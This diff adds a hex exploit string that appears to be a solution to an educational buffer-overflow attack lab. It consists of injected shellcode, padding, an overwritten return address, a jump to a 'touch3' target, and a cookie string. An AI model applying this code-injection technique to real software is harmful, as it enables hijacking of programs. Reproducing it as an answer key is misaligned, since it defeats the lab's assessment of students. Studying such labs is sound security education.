@@ -1,0 +1,11 @@
+48 c7 c7 b8 e8 64 55 c3 /* movq rsp+0x48 (+buf, +72 decimal) into rdi and retq */
+AA AA AA AA AA AA AA AA 
+AA AA AA AA AA AA AA AA 
+AA AA AA AA AA AA AA AA 
+AA AA AA AA AA AA AA AA 
+AA AA AA AA AA AA AA AA 
+AA AA AA AA AA AA AA AA /* padding */
+70 e8 64 55 00 00 00 00 /* rsp */
+1d 2c 40 00 00 00 00 00 /* touch 3 start addr */
+33 30 65 64 62 38 63 35 /* cookie as string */
+00 /* end cookie string */
